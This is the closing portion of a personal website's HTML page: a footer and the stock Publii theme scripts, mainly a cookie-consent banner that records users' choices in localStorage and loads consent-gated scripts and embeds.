href="https://www.linkedin.com/in/sakibulalikhan/" aria-label="LinkedIn" class="linkedin"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg></a></div><div class="footer__copyright">Sakibul Ali Khan â€¢ 2023 â€¢ sakibulalikhan.github.io</div></footer><script>window.publiiThemeMenuConfig = {    
      mobileMenuMode: 'sidebar',
      animationSpeed: 300,
      submenuWidth: 'auto',
      doubleClickTime: 500,
      mobileMenuExpandableSubmenus: true, 
      relatedContainerForOverlayMenuSelector: '.navbar',
   };</script><script defer="defer" src="https://sakibulalikhan.pages.dev/assets/js/scripts.min.js?v=66112a161d5939d966ce2b20c13988d9"></script><script>var images = document.querySelectorAll('img[loading]');

      for (var i = 0; i < images.length; i++) {
         if (images[i].complete) {
               images[i].classList.add('is-loaded');
         } else {
               images[i].addEventListener('load', function () {
                  this.classList.add('is-loaded');
               }, false);
         }
      }</script><div class="pcb" data-behaviour="badge" data-behaviour-link="#cookie-settings" data-revision="1" data-config-ttl="0" data-debug-mode="false"><div role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="pcb-title" aria-describedby="pcb-txt" class="pcb__banner pcb__banner--left"><div class="pcb__inner"><div id="pcb-title" role="heading" aria-level="2" class="pcb__title">Cookies</div><div id="pcb-txt" class="pcb__txt">This website uses cookies to ensure you get the best experience on our site.</div><div class="pcb__buttons"><button type="button" class="pcb__btn pcb__btn--solid pcb__btn--accept">Ok, I Understand.</button></div></div></div><button class="pcb__badge" aria-label="Cookie Policy" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" width="40" height="40" viewBox="0 0 23 23" fill="currentColor"><path d="M21.41 12.71c-.08-.01-.15 0-.22 0h-.03c-.03 0-.05 0-.08.01-.07 0-.13.01-.19.04-.52.21-1.44.19-2.02-.22-.44-.31-.65-.83-.62-1.53a.758.758 0 0 0-.27-.61.73.73 0 0 0-.65-.14c-1.98.51-3.49.23-4.26-.78-.82-1.08-.73-2.89.24-4.49.14-.23.14-.52 0-.75a.756.756 0 0 0-.67-.36c-.64.03-1.11-.1-1.31-.35-.19-.26-.13-.71-.01-1.29.04-.18.06-.38.03-.59-.05-.4-.4-.7-.81-.66C5.1 1.54 1 6.04 1 11.48 1 17.28 5.75 22 11.6 22c5.02 0 9.39-3.54 10.39-8.42.08-.4-.18-.78-.58-.87Zm-9.81 7.82c-5.03 0-9.12-4.06-9.12-9.06 0-4.34 3.05-8 7.25-8.86-.08.7.05 1.33.42 1.81.24.32.66.67 1.38.84-.76 1.86-.65 3.78.36 5.11.61.81 2.03 2 4.95 1.51.18.96.71 1.54 1.18 1.87.62.43 1.38.62 2.1.62.05 0 .09 0 .13-.01-1.23 3.64-4.7 6.18-8.64 6.18ZM13 17c0 .55-.45 1-1 1s-1-.45-1-1 .45-1 1-1 1 .45 1 1Zm5.29-12.3a.99.99 0 0 1-.29-.71c0-.55.45-.99 1-.99a1 1 0 0 1 .71.3c.19.19.29.44.29.71 0 .55-.45.99-1 .99a1 1 0 0 1-.71-.3ZM9 13.5c0 .83-.67 1.5-1.5 1.5S6 14.33 6 13.5 6.67 12 7.5 12s1.5.67 1.5 1.5Zm3.25.81a.744.744 0 0 1-.06-1.05c.28-.32.75-.34 1.05-.06.31.28.33.75.05 1.06-.15.16-.35.25-.56.25-.18 0-.36-.06-.5-.19ZM8.68 7.26c.41.37.44 1 .07 1.41-.2.22-.47.33-.75.33a.96.96 0 0 1-.67-.26c-.41-.37-.44-1-.07-1.41.37-.42 1-.45 1.41-.08Zm11.48 1.88c.18-.19.52-.19.7 0 .05.04.09.1.11.16.03.06.04.12.04.19 0 .13-.05.26-.15.35-.09.1-.22.15-.35.15s-.26-.05-.35-.15a.355.355 0 0 1-.11-.16.433.433 0 0 1-.04-.19c0-.13.05-.26.15-.35Zm-4.93-1.86a.75.75 0 1 1 1.059-1.06.75.75 0 0 1-1.059 1.06Z"/></svg></button></div><script>(function(win) {
    if (!document.querySelector('.pcb')) {
        return;
    }

    var cbConfig = {
        behaviour: document.querySelector('.pcb').getAttribute('data-behaviour'),
        behaviourLink: document.querySelector('.pcb').getAttribute('data-behaviour-link'),
        revision: document.querySelector('.pcb').getAttribute('data-revision'),
        configTTL: parseInt(document.querySelector('.pcb').getAttribute('data-config-ttl'), 10),
        debugMode: document.querySelector('.pcb').getAttribute('data-debug-mode') === 'true',
        initialState: null,
        previouslyAccepted: []
    };

    var cbUI = {
        wrapper: document.querySelector('.pcb'),
        banner: {
            element: null,
            btnAccept: null,
            btnReject: null,
            btnConfigure: null
        },
        popup: {
            element: null,
            btnClose: null,
            btnSave: null,
            btnAccept: null,
            btnReject: null,
            checkboxes: null,
        },
        overlay: null,
        badge: null,
        blockedScripts: document.querySelectorAll('script[type^="gdpr-blocker/"]'),
        triggerLinks: cbConfig.behaviourLink ? document.querySelectorAll('a[href*="' + cbConfig.behaviourLink + '"]') : null
    };

    function initUI () {
        // setup banner elements
        cbUI.banner.element = cbUI.wrapper.querySelector('.pcb__banner');
        cbUI.banner.btnAccept = cbUI.banner.element.querySelector('.pcb__btn--accept');
        cbUI.banner.btnReject = cbUI.banner.element.querySelector('.pcb__btn--reject');
        cbUI.banner.btnConfigure = cbUI.banner.element.querySelector('.pcb__btn--configure');

        // setup popup elements
        if (cbUI.wrapper.querySelector('.pcb__popup')) {
            cbUI.popup.element = cbUI.wrapper.querySelector('.pcb__popup');
            cbUI.popup.btnClose = cbUI.wrapper.querySelector('.pcb__popup__close');
            cbUI.popup.btnSave = cbUI.popup.element.querySelector('.pcb__btn--save');
            cbUI.popup.btnAccept = cbUI.popup.element.querySelector('.pcb__btn--accept');
            cbUI.popup.btnReject = cbUI.popup.element.querySelector('.pcb__btn--reject');
            cbUI.popup.checkboxes = cbUI.popup.element.querySelector('input[type="checkbox"]');
            // setup overlay
            cbUI.overlay = cbUI.wrapper.querySelector('.pcb__overlay');
        }

        cbUI.badge = cbUI.wrapper.querySelector('.pcb__badge');

        if (cbConfig.behaviour.indexOf('link') > -1) {
            for (var i = 0; i < cbUI.triggerLinks.length; i++) {
                cbUI.triggerLinks[i].addEventListener('click', function(e) {
                    e.preventDefault();
                    showBannerOrPopup();
                });
            }
        }
    }

    function initState () {
        var lsKeyName = getConfigName();
        var currentConfig = localStorage.getItem(lsKeyName);
        var configIsFresh = checkIfConfigIsFresh();

        if (!configIsFresh || currentConfig === null) {
            if (cbConfig.debugMode) {
                console.log('ðŸª Config not found, or configuration expired');
            }

            showBanner();
        } else if (typeof currentConfig === 'string') {
            if (cbConfig.debugMode) {
                console.log('ðŸª Config founded');
            }

            showBadge();

            if (cbUI.popup.element) {
                var allowedGroups = currentConfig.split(',');
                var checkedCheckboxes = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');

                for (var j = 0; j < checkedCheckboxes.length; j++) {
                    var name = checkedCheckboxes[j].getAttribute('data-group-name');

                    if (name && name !== '-' && allowedGroups.indexOf(name) === -1) {
                        checkedCheckboxes[j].checked = false;
                    }
                }

                for (var i = 0; i < allowedGroups.length; i++) {
                    var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + allowedGroups[i] + '"]');

                    if (checkbox) {
                        checkbox.checked = true;
                    }

                    allowCookieGroup(allowedGroups[i]);
                }
            }
        }

        setTimeout(function () {
            cbConfig.initialState = getInitialStateOfConsents();
        }, 0);
    }

    function checkIfConfigIsFresh () {
        var lastConfigSave = localStorage.getItem('publii-gdpr-cookies-config-save-date');

        if (lastConfigSave === null) {
            return false;
        }

        lastConfigSave = parseInt(lastConfigSave, 10);

        if (lastConfigSave === 0) {
            return true;
        }

        if (+new Date() - lastConfigSave < cbConfig.configTTL * 24 * 60 * 60 * 1000) {
            return true;
        }

        return false;
    }

    function initBannerEvents () {
        cbUI.banner.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('banner');
            showBadge();
        }, false);

        if (cbUI.banner.btnReject) {
            cbUI.banner.btnReject.addEventListener('click', function (e) {
                e.preventDefault();
                rejectAllCookies();
                showBadge();
            }, false);
        }

        if (cbUI.banner.btnConfigure) {
            cbUI.banner.btnConfigure.addEventListener('click', function (e) {
                e.preventDefault();
                hideBanner();
                showAdvancedPopup();
                showBadge();
            }, false);
        }
    }

    function initPopupEvents () {
        if (!cbUI.popup.element) {
            return;
        }

        cbUI.overlay.addEventListener('click', function (e) {
            hideAdvancedPopup();
        }, false);

        cbUI.popup.element.addEventListener('click', function (e) {
            e.stopPropagation();
        }, false);

        cbUI.popup.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('popup');
        }, false);

        cbUI.popup.btnReject.addEventListener('click', function (e) {
            e.preventDefault();
            rejectAllCookies();
        }, false);

        cbUI.popup.btnSave.addEventListener('click', function (e) {
            e.preventDefault();
            saveConfiguration();
        }, false);

        cbUI.popup.btnClose.addEventListener('click', function (e) {
            e.preventDefault();
            hideAdvancedPopup();
        }, false);
    }

    function initBadgeEvents () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.addEventListener('click', function (e) {
            showBannerOrPopup();
        }, false);
    }

    initUI();
    initState();
    initBannerEvents();
    initPopupEvents();
    initBadgeEvents();

    /**
     * API
     */
    function addScript (src, inline) {
        var newScript = document.createElement('script');

        if (src) {
            newScript.setAttribute('src', src);
        }

        if (inline) {
            newScript.text = inline;
        }

        document.body.appendChild(newScript);
    }

    function allowCookieGroup (allowedGroup) {
        var scripts = document.querySelectorAll('script[type="gdpr-blocker/' + allowedGroup + '"]');
        cbConfig.previouslyAccepted.push(allowedGroup);
    
        for (var j = 0; j < scripts.length; j++) {
            addScript(scripts[j].src, scripts[j].text);
        }

        var groupEvent = new Event('publii-cookie-banner-unblock-' + allowedGroup);
        document.body.dispatchEvent(groupEvent);
        unlockEmbeds(allowedGroup);

        if (cbConfig.debugMode) {
            console.log('ðŸª Allowed group: ' + allowedGroup);
        }
    }

    function showBannerOrPopup () {
        if (cbUI.popup.element) {
            showAdvancedPopup();
        } else {
            showBanner();
        }
    }

    function showAdvancedPopup () {
        cbUI.popup.element.classList.add('is-visible');
        cbUI.overlay.classList.add('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'false');
        cbUI.overlay.setAttribute('aria-hidden', 'false');
    }

    function hideAdvancedPopup () {
        cbUI.popup.element.classList.remove('is-visible');
        cbUI.overlay.classList.remove('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'true');
        cbUI.overlay.setAttribute('aria-hidden', 'true');
    }

    function showBanner () {
        cbUI.banner.element.classList.add('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'false');
    }

    function hideBanner () {
        cbUI.banner.element.classList.remove('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'true');
    }

    function showBadge () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.classList.add('is-visible');
        cbUI.badge.setAttribute('aria-hidden', 'false');
    }

    function getConfigName () {
        var lsKeyName = 'publii-gdpr-allowed-cookies';

        if (cbConfig.revision) {
            lsKeyName = lsKeyName + '-v' + parseInt(cbConfig.revision, 10);
        }

        return lsKeyName;
    }

    function storeConfiguration (allowedGroups) {
        var lsKeyName = getConfigName();
        var dataToStore = allowedGroups.join(',');
        localStorage.setItem(lsKeyName, dataToStore);

        if (cbConfig.configTTL === 0) {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', 0);

            if (cbConfig.debugMode) {
                console.log('ðŸª Store never expiring configuration');
            }
        } else {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', +new Date());
        }
    }

    function getInitialStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('ðŸª Initial state: ' + groups.join(', '));
        }

        return groups;
    }

    function getCurrentStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('ðŸª State to save: ' + groups.join(', '));
        }

        return groups;
    }

    function getAllGroups () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        return groups;
    }

    function acceptAllCookies (source) {
        var groupsToAccept = getAllGroups();
        storeConfiguration(groupsToAccept);

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('ðŸª Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        if (cbUI.popup.element) {
            var checkboxesToCheck = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');

            for (var j = 0; j < checkboxesToCheck.length; j++) {
                checkboxesToCheck[j].checked = true;
            }
        }

        if (cbConfig.debugMode) {
            console.log('ðŸª Accept all cookies: ', groupsToAccept.join(', '));
        }

        if (source === 'popup') {
            hideAdvancedPopup();
        } else if (source === 'banner') {
            hideBanner();
        }
    }

    function rejectAllCookies () {
        if (cbConfig.debugMode) {
            console.log('ðŸª Reject all cookies');
        }

        storeConfiguration([]);
        setTimeout(function () {
            window.location.reload();
        }, 100);
    }

    function saveConfiguration () {
        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('ðŸª Save new config: ', groupsToAccept.join(', '));
        }

        if (reloadIsNeeded(groupsToAccept)) {
            setTimeout(function () {
                window.location.reload();
            }, 100);
            return;
        }

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('ðŸª Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        hideAdvancedPopup();
    }

    function reloadIsNeeded (groupsToAccept) {
        // check if user rejected consent for initial groups
        var initialGroups = cbConfig.initialState;
        var previouslyAcceptedGroups = cbConfig.previouslyAccepted;
        var groupsToCheck = initialGroups.concat(previouslyAcceptedGroups);

        for (var i = 0; i < groupsToCheck.length; i++) {
            var groupToCheck = groupsToCheck[i];

            if (groupsToAccept.indexOf(groupToCheck) === -1) {
                if (cbConfig.debugMode) {
                    console.log('ðŸª Reload is needed due lack of: ', groupToCheck);
                }

                return true;
            }
        }

        return false;
    }

    function unlockEmbeds (cookieGroup) {
        var iframesToUnlock = document.querySelectorAll('.pec-wrapper[data-consent-group-id="' + cookieGroup + '"]');

        for (var i = 0; i < iframesToUnlock.length; i++) {
            var iframeWrapper = iframesToUnlock[i];
            iframeWrapper.querySelector('.pec-overlay').classList.remove('is-active');
            iframeWrapper.querySelector('.pec-overlay').setAttribute('aria-hidden', 'true');
            var iframe = iframeWrapper.querySelector('iframe');
            iframe.setAttribute('src', iframe.getAttribute('data-consent-src'));
        }
    }

    win.publiiEmbedConsentGiven = function (cookieGroup) {
        // it will unlock embeds
        allowCookieGroup(cookieGroup);

        var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + cookieGroup + '"]');

        if (checkbox) {
            checkbox.checked = true;
        }

        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('ðŸª Save new config: ', groupsToAccept.join(', '));
        }
    }
})(window);</script></body></html>